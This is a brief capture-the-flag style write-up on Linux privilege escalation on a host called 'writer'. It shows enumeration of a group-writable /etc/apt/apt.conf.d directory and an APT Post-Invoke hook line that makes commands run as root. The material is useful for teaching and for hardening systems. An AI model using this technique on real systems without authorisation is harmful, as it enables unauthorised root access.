# Privilege escalation to root
## `id` command shows that john is member of `management` group and using `find` to find files/folders owned by `management` group
 `id` command shows that john is member of `management` group and using `find` command to find files/folders owned by `management` group shows that ` /etc/apt/apt.conf.d` is owned by `management` group.
```bash
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
john@writer:~$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
john@writer:~$ ls -la /etc/apt/apt.conf.d
total 48
drwxrwxr-x 2 root management 4096 Oct  3 14:54 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
john@writer:~$
```
## Using [link](https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html) to Create a file in  directory `/etc/apt/apt.conf.d` called, for example, `1000-pwned` and the write your hooks within it:

```
APT::Update::Post-Invoke {"id > /tmp/whoami";};
```